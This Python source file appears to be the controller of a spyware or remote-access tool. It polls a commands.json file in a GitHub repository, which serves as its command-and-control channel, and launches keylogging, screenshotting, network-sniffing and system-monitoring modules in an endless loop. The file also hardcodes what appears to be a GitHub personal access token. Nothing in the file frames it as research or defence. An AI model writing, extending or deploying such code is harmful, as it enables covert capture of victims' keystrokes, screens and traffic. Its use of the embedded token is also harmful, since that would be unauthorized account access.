from github import Github
access_token = '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'
g = Github(access_token)
user = g.get_user()
repo = user.get_repo('python_development')


from keylogger import Keylogger
from sysinfo import SysInfo
from screenshot import Screenshot
from sniffer import Sniffer
import psutil
import time
import json

def command_listener():
    contents = repo.get_contents("commands.json")
    return contents.decoded_content

def mod_keylogger():
    k = Keylogger()
    k.keylogger()

def mod_sysinfo():
    s = SysInfo()
    s.get_usage(psutil.cpu_percent(), psutil.virtual_memory().percent,30)
    time.sleep(0.5)

def mod_screenshotter():
    s = Screenshot()
    s.auto_screen()

def mod_sniffer():
    s = Sniffer()
    s.start_sniffing()

def start_program():
    json_commands = command_listener()
    decoded_commands = json.loads(json_commands)
    for command in decoded_commands["commands"]:
        type = command["command"]
        match type:
            case 'keylogger':
                print("Started keylogging")
                mod_keylogger()
                print("Ended keylogging")
            case 'screenshot':                            
                print("Started screenshotting")
                mod_screenshotter()
                print("Stopped screenshotting")
            case 'sysinfo':
                print("Started the sysinfo")
                mod_sysinfo()
                print("Stopped the sysinfo")
            case 'sniffer':
                print("Started sniffing")
                mod_sniffer()
                print("Stopped sniffing")

while True:
    start_program()
 
